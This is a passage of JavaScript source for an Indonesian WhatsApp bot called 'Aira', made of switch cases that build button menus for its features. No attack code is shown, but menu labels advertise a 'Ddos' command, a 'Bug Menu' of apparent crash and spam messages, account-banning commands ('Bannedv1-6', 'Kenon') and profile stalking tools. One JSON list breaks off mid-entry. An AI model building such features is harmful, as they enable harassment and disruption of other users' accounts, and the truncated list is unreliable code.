    { "header": "Waifu", "title": "Fitur waifu", "id": ".waifu" },
    { "header": "Ppcp", "title": "Fitur ppcp", "id": ".ppcp" },
    { "header": "Cosplay", "title": "Fitur cosplay", "id": ".cosplay" },
    { "header": "Cecan", "title": "Fitur cecan", "id": ".cecan" },
    { "header": "Cogan", "title": "Fitur cogan", "id": ".cogan" },
    { "header": "Meme", "title": "Fitur meme", "id": ".meme" },
    { "header": "Memeindo", "title": "Fitur memeindo", "id": ".memeindo" },
    { "header": "Darkjokes", "title": "Fitur darkjokes", "id": ".darkjokes" }
]
`
let namaMenu=`Random Menu 🔀
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'randomquotes':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: randomQuotes(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await randomQuotes(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Quotesdilan", "title": "Fitur quotesdilan", "id": ".quotesdilan" },
    { "header": "Quotesbucin", "title": "Fitur quotesbucin", "id": ".quotesbucin" },
    { "header": "Quotesjawa", "title": "Fitur quotesjawa", "id": ".quotesjawa" },
    { "header": "Quotesanime", "title": "Fitur quotesanime", "id": ".quotesanime" },
    { "header": "Galau", "title": "Fitur galau", "id": ".galau" }
]

`
let namaMenu=`Random Quotes 💬
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'cewekasiamenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: cewekMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await cewekMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Lisa", "title": "Fitur lisa", "id": ".lisa" },
    { "header": "Rose", "title": "Fitur rose", "id": ".rose" },
    { "header": "Jiso", "title": "Fitur jiso", "id": ".jiso" },
    { "header": "Jenny", "title": "Fitur jenny", "id": ".jenny" },
    { "header": "Indonesia", "title": "Fitur indonesia", "id": ".indonesia" },
    { "header": "Japan", "title": "Fitur japan", "id": ".japan" },
    { "header": "China", "title": "Fitur china", "id": ".china" },
    { "header": "Malaysia", "title": "Fitur malaysia", "id": ".malaysia" },
    { "header": "Vietnam", "title": "Fitur vietnam", "id": ".vietnam" },
    { "header": "Korea", "title": "Fitur korea", "id": ".korea" },
    { "header": "Thailand", "title": "Fitur thailand", "id": ".thailand" }
]
`
let namaMenu=`Cewek Asia Menu 👩
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'cowokasiamenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: cowokMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await cowokMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Suga", "title": "Fitur suga", "id": ".suga" },
    { "header": "Wuyifan", "title": "Fitur wuyifan", "id": ".wuyifan" },
    { "header": "Parkchanyeol", "title": "Fitur parkchanyeol", "id": ".parkchanyeol" },
    { "header": "Ohsehun", "title": "Fitur ohsehun", "id": ".ohsehun" },
    { "header": "Luhan", "title": "Fitur luhan", "id": ".luhan" },
    { "header": "Kimtaehyung", "title": "Fitur kimtaehyung", "id": ".kimtaehyung" },
    { "header": "Kimsoek", "title": "Fitur kimsoek", "id": ".kimsoek" },
    { "header": "Kimnanjoon", "title": "Fitur kimnanjoon", "id": ".kimnanjoon" },
    { "header": "Kimjunmyeon", "title": "Fitur kimjunmyeon", "id": ".kimjunmyeon" },
    { "header": "Kimjong", "title": "Fitur kimjong", "id": ".kimjong" },
    { "header": "Kimjondae", "title": "Fitur kimjondae", "id": ".kimjondae" },
    { "header": "Jungkook", "title": "Fitur jungkook", "id": ".jungkook" },
    { "header": "Jimin", "title": "Fitur jimin", "id": ".jimin" },
    { "header": "Jhope", "title": "Fitur jhope", "id": ".jhope" },
    { "header": "Huangzitao", "title": "Fitur huangzitao", "id": ".huangzitao" },
    { "header": "Dohkyungsoo", "title": "Fitur dohkyungsoo", "id": ".dohkyungsoo" },
    { "header": "Baekhyung", "title": "Fitur baekhyung", "id": ".baekhyung" }
]
`
let namaMenu=`Cowok Asia Menu 👨
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'balancemenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: balanceMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await balanceMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Balance", "title": "Fitur balance", "id": ".balance" },
    { "header": "Limit", "title": "Fitur limit", "id": ".limit" },
    { "header": "Buylimit", "title": "Fitur buylimit", "id": ".buylimit" },
    { "header": "Buyglimit", "title": "Fitur buyglimit", "id": ".buyglimit" },
    { "header": "Transfer", "title": "Fitur transfer", "id": ".transfer" },
    { "header": "Toplocal", "title": "Fitur toplocal", "id": ".toplocal" },
    { "header": "Topglobal", "title": "Fitur topglobal", "id": ".topglobal" }
]
`
let namaMenu=`Balance Menu 📊
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'ownermenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: ownerMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await ownerMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Restart", "title": "Fitur restart", "id": ".restart" },
    { "header": "Shutdown", "title": "Fitur shutdown", "id": ".shutdown" },
    { "header": "Pushkontak", "title": "Fitur pushkontak", "id": ".pushkontak" },
    { "header": "Self", "title": "Fitur self", "id": ".self" },
    { "header": "Public", "title": "Fitur public", "id": ".public" },
    { "header": "Setppbot", "title": "Fitur setppbot", "id": ".setppbot" },
    { "header": "Setppbot2", "title": "Fitur setppbot2", "id": ".setppbot2" },
    { "header": "Listgc", "title": "Fitur listgc", "id": ".listgc" },
    { "header": "Creategc", "title": "Fitur creategc", "id": ".creategc" },
    { "header": "Joingc", "title": "Fitur joingc", "id": ".joingc" },
    { "header": "Leavegc", "title": "Fitur leavegc", "id": ".leavegc" },
    { "header": "Bcall", "title": "Fitur bcall", "id": ".bcall" },
    { "header": "Broadcast", "title": "Fitur broadcast", "id": ".broadcast" },
    { "header": "Bcimg", "title": "Fitur bcimg", "id": ".bcimg" },
    { "header": "Bcstik", "title": "Fitur bcstik", "id": ".bcstik" },
    { "header": "Bcvn", "title": "Fitur bcvn", "id": ".bcvn" },
    { "header": "Bcvideo", "title": "Fitur bcvideo", "id": ".bcvideo" },
    { "header": "Bcsewa", "title": "Fitur bcsewa", "id": ".bcsewa" },
    { "header": "Getdb", "title": "Fitur getdb", "id": ".getdb" },
    { "header": "Getcase", "title": "Fitur getcase", "id": ".getcase" },
    { "header": "Ddos", "title": "Fitur ddos", "id": ".ddos" },
    { "header": "Addowner", "title": "Fitur addowner", "id": ".addowner" },
    { "header": "Delowner", "title": "Fitur delowner", "id": ".delowner" },
    { "header": "Addpremium", "title": "Fitur addpremium", "id": ".addpremium" },
    { "header": "Delpremium", "title": "Fitur delpremium", "id": ".delpremium" },
    { "header": "Addsewa", "title": "Fitur addsewa", "id": ".addsewa" },
    { "header": "Delsewa", "title": "Fitur delsewa", "id": ".delsewa" },
    { "header": "Blok", "title": "Fitur blok", "id": ".blok" },
    { "header": "Unblok", "title": "Fitur unblok", "id": ".unblok" },
    { "header": "Listblok", "title": "Fitur listblok", "id": ".listblok" },
    { "header": "Autoaipc", "title": "Fitur autoaipc", "id": ".autoaipc" },
    { "header": "Autoread", "title": "Fitur autoread", "id": ".autoread" },
    { "header": "Autobio", "title": "Fitur autobio", "id": ".autobio" },
    { "header": "Antidelete", "title": "Fitur antidelete", "id": ".antidelete" },
    { "header": "Antiviewonce", "title": "Fitur antiviewonce", "id": ".antiviewonce" },
    { "header": "Autorespond", "title": "Fitur autorespond", "id": ".autorespond" },
    { "header": "Anticall", "title": "Fitur anticall", "id": ".anticall" },
    { "header": "Autoblok212", "title": "Fitur autoblok212", "id": ".autoblok212" },
    { "header": "Resetlimit", "title": "Fitur resetlimit", "id": ".resetlimit" }
]
`
let namaMenu=`Owner Menu 👨‍💼
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'storagemenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: storageMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await storageMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Addstik", "title": "Fitur addstik", "id": ".addstik" },
    { "header": "Addvn", "title": "Fitur addvn", "id": ".addvn" },
    { "header": "Addimg", "title": "Fitur addimg", "id": ".addimg" },
    { "header": "Addvid", "title": "Fitur addvid", "id": ".addvid" },
    { "header": "Liststik", "title": "Fitur liststik", "id": ".liststik" },
    { "header": "Listvn", "title": "Fitur listvn", "id": ".listvn" },
    { "header": "Listimg", "title": "Fitur listimg", "id": ".listimg" },
    { "header": "Listvid", "title": "Fitur listvid", "id": ".listvid" },
    { "header": "Sampah", "title": "Fitur sampah", "id": ".sampah" },
    { "header": "Delsampah", "title": "Fitur delsampah", "id": ".delsampah" },
    { "header": "Sampah2", "title": "Fitur sampah2", "id": ".sampah2" },
    { "header": "Delsampah2", "title": "Fitur delsampah2", "id": ".delsampah2" }
]
`
let namaMenu=`Storage Menu  💾
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'asupanmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: asupanMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await asupanMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Asupan", "title": "Fitur asupan", "id": ".asupan" },
    { "header": "Bocil", "title": "Fitur bocil", "id": ".bocil" },
    { "header": "Santuy", "title": "Fitur santuy", "id": ".santuy" },
    { "header": "Ukhty", "title": "Fitur ukhty", "id": ".ukhty" },
    { "header": "Chika", "title": "Fitur chika", "id": ".chika" },
    { "header": "Delvira", "title": "Fitur delvira", "id": ".delvira" },
    { "header": "Ayu", "title": "Fitur ayu", "id": ".ayu" },
    { "header": "Bunga", "title": "Fitur bunga", "id": ".bunga" },
    { "header": "Aura", "title": "Fitur aura", "id": ".aura" },
    { "header": "Nisa", "title": "Fitur nisa", "id": ".nisa" },
    { "header": "Ziva", "title": "Fitur ziva", "id": ".ziva" },
    { "header": "Yana", "title": "Fitur yana", "id": ".yana" },
    { "header": "Viona", "title": "Fitur viona", "id": ".viona" },
    { "header": "Syania", "title": "Fitur syania", "id": ".syania" },
    { "header": "Riri", "title": "Fitur riri", "id": ".riri" },
    { "header": "Syifa", "title": "Fitur syifa", "id": ".syifa" },
    { "header": "Mama_gina", "title": "Fitur mama_gina", "id": ".mama_gina" },
    { "header": "Alcakenya", "title": "Fitur alcakenya", "id": ".alcakenya" },
    { "header": "Mangayutri", "title": "Fitur mangayutri", "id": ".mangayutri" },
    { "header": "Rikagusriani", "title": "Fitur rikagusriani", "id": ".rikagusriani" },
    { "header": "Geayubi", "title": "Fitur geayubi", "id": ".geayubi" },
    { "header": "Syifa", "title": "Fitur syifa", "id"
`
let namaMenu=`Asupan Menu🍽
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'randomsticker':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: randomSticker(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await randomSticker(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Patrick", "title": "Fitur patrick", "id": ".patrick" },
    { "header": "Sponsbob", "title": "Fitur sponsbob", "id": ".sponsbob" },
    { "header": "Kawan-sponsbob", "title": "Fitur kawan-sponsbob", "id": ".kawan-sponsbob" },
    { "header": "Dino-kuning", "title": "Fitur dino-kuning", "id": ".dino-kuning" },
    { "header": "Manusia-lidi", "title": "Fitur manusia-lidi", "id": ".manusia-lidi" },
    { "header": "Popoci", "title": "Fitur popoci", "id": ".popoci" },
    { "header": "Awoawo", "title": "Fitur awoawo", "id": ".awoawo" },
    { "header": "Chat", "title": "Fitur chat", "id": ".chat" },
    { "header": "Dbfly", "title": "Fitur dbfly", "id": ".dbfly" },
    { "header": "Doge", "title": "Fitur doge", "id": ".doge" },
    { "header": "Gojosatoru", "title": "Fitur gojosatoru", "id": ".gojosatoru" },
    { "header": "Hope-boy", "title": "Fitur hope-boy", "id": ".hope-boy" },
    { "header": "Jisoo", "title": "Fitur jisoo", "id": ".jisoo" },
    { "header": "Kr-robot", "title": "Fitur kr-robot", "id": ".kr-robot" },
    { "header": "Kucing", "title": "Fitur kucing", "id": ".kucing" },
    { "header": "Lonte", "title": "Fitur lonte", "id": ".lonte" },
    { "header": "Menjamet", "title": "Fitur menjamet", "id": ".menjamet" },
    { "header": "Meow", "title": "Fitur meow", "id": ".meow" },
    { "header": "Nicholas", "title": "Fitur nicholas", "id": ".nicholas" },
    { "header": "Tyni", "title": "Fitur tyni", "id": ".tyni" }
]

`
let namaMenu=`Random Stiker 🎭
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'stalkingmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: stalkingMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await stalkingMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Igstalk", "title": "Fitur igstalk", "id": ".igstalk" },
    { "header": "Mlstalk", "title": "Fitur mlstalk", "id": ".mlstalk" },
    { "header": "Ffstalk", "title": "Fitur ffstalk", "id": ".ffstalk" },
    { "header": "Wastalk", "title": "Fitur wastalk", "id": ".wastalk" }
]
`
let namaMenu=`Stalking Menu 👤
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'imageeffect':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: imageEffect(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await imageEffect(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Toanime", "title": "Fitur toanime", "id": ".toanime" },
    { "header": "Tozombie", "title": "Fitur tozombie", "id": ".tozombie" },
    { "header": "Differentme", "title": "Fitur differentme", "id": ".differentme" },
    { "header": "Differentme2", "title": "Fitur differentme2", "id": ".differentme2" },
    { "header": "Aiscene", "title": "Fitur aiscene", "id": ".aiscene" },
    { "header": "Remini", "title": "Fitur remini", "id": ".remini" },
    { "header": "Hdr", "title": "Fitur hdr", "id": ".hdr" },
    { "header": "Wasted", "title": "Fitur wasted", "id": ".wasted" },
    { "header": "Beautiful", "title": "Fitur beautiful", "id": ".beautiful" },
    { "header": "Fire", "title": "Fitur fire", "id": ".fire" },
    { "header": "Wanted", "title": "Fitur wanted", "id": ".wanted" },
    { "header": "Rip", "title": "Fitur rip", "id": ".rip" },
    { "header": "Jail", "title": "Fitur jail", "id": ".jail" },
    { "header": "Triggered", "title": "Fitur triggered", "id": ".triggered" },
    { "header": "Brazzers", "title": "Fitur brazzers", "id": ".brazzers" },
    { "header": "Gay", "title": "Fitur gay", "id": ".gay" },
    { "header": "Postig", "title": "Fitur postig", "id": ".postig" }
]
`
let namaMenu=`Image Effect 🎨
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'funmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: funMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await funMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Apakah", "title": "Fitur apakah", "id": ".apakah" },
    { "header": "Kapankah", "title": "Fitur kapankah", "id": ".kapankah" },
    { "header": "Bisakah", "title": "Fitur bisakah", "id": ".bisakah" },
    { "header": "Bagaimanakah", "title": "Fitur bagaimanakah", "id": ".bagaimanakah" },
    { "header": "Rate", "title": "Fitur rate", "id": ".rate" },
    { "header": "Gantengcek", "title": "Fitur gantengcek", "id": ".gantengcek" },
    { "header": "Cekganteng", "title": "Fitur cekganteng", "id": ".cekganteng" },
    { "header": "Cantikcek", "title": "Fitur cantikcek", "id": ".cantikcek" },
    { "header": "Cekcantik", "title": "Fitur cekcantik", "id": ".cekcantik" },
    { "header": "Sangecek", "title": "Fitur sangecek", "id": ".sangecek" },
    { "header": "Ceksange", "title": "Fitur ceksange", "id": ".ceksange" },
    { "header": "Gaycek", "title": "Fitur gaycek", "id": ".gaycek" },
    { "header": "Cekgay", "title": "Fitur cekgay", "id": ".cekgay" },
    { "header": "Lesbicek", "title": "Fitur lesbicek", "id": ".lesbicek" },
    { "header": "Ceklesbi", "title": "Fitur ceklesbi", "id": ".ceklesbi" },
    { "header": "Wangy", "title": "Fitur wangy", "id": ".wangy" }
]
`
let namaMenu=`Fun Menu 🎉
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'islammenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: islamMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await islamMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Kisahnabi", "title": "Fitur kisahnabi", "id": ".kisahnabi" },
    { "header": "Asmaulhusna", "title": "Fitur asmaulhusna", "id": ".asmaulhusna" },
    { "header": "Listsurah", "title": "Fitur listsurah", "id": ".listsurah" },
    { "header": "Randomquran", "title": "Fitur randomquran", "id": ".randomquran" },
    { "header": "Randomquran2", "title": "Fitur randomquran2", "id": ".randomquran2" },
    { "header": "Quranaudio", "title": "Fitur quranaudio", "id": ".quranaudio" },
    { "header": "Alquranaudio", "title": "Fitur alquranaudio", "id": ".alquranaudio" }
]
`
let namaMenu=`Islam Menu ☪️
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'banmenu': case 'unbanmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: banMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await banMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Kenon", "title": "Fitur kenon", "id": ".kenon" },
    { "header": "Out", "title": "Fitur out", "id": ".out" },
    { "header": "Verif", "title": "Fitur verif", "id": ".verif" },
    { "header": "Bannedv1", "title": "Fitur bannedv1", "id": ".bannedv1" },
    { "header": "Bannedv2", "title": "Fitur bannedv2", "id": ".bannedv2" },
    { "header": "Bannedv3", "title": "Fitur bannedv3", "id": ".bannedv3" },
    { "header": "Bannedv4", "title": "Fitur bannedv4", "id": ".bannedv4" },
    { "header": "Bannedv5", "title": "Fitur bannedv5", "id": ".bannedv5" },
    { "header": "Bannedv6", "title": "Fitur bannedv6", "id": ".bannedv6" },
    { "header": "Unbannedv1", "title": "Fitur unbannedv1", "id": ".unbannedv1" },
    { "header": "Unbannedv2", "title": "Fitur unbannedv2", "id": ".unbannedv2" },
    { "header": "Unbannedv3", "title": "Fitur unbannedv3", "id": ".unbannedv3" },
    { "header": "Unbannedv4", "title": "Fitur unbannedv4", "id": ".unbannedv4" },
    { "header": "Unbannedv5", "title": "Fitur unbannedv5", "id": ".unbannedv5" }
]
`
let namaMenu=`Banned Menu 🚫
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
  
case 'bugmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: bugMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

let teksnya= await bugMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix)
let json=`[
    { "header": "Aira", "title": "Fitur aira", "id": ".aira" },
    { "header": "Santet", "title": "Fitur santet", "id": ".santet" },
    { "header": "Bugs", "title": "Fitur bugs", "id": ".bugs" },
    { "header": "Buglink", "title": "Fitur buglink", "id": ".buglink" },
    { "header": "Spams", "title": "Fitur spams", "id": ".spams" }
]
`
let namaMenu=`Bug Menu 🐞
`
await sendButMenu(teksnya,json,namaMenu)

Aira.sendMessage(m.chat, {audio: fs.readFileSync(setting.audio_di_bagian_menu), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'nsfwmenu':{
let mundur = hitungmundur(1, 1, 2025)
let lebaran = hitungmundur(17, 8, 2024) 
await loading() 
/*await Aira.sendMessage(m.chat, {
text: nsfwMenu(role, ucapanWaktu, pushname, lebaran, mundur, upload, download, ownerName, botName, jam, tanggal, runtime, isCreator, isPremium, m.sender, limitCount, limit, gcount, glimit, balance, prefix),
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})*/

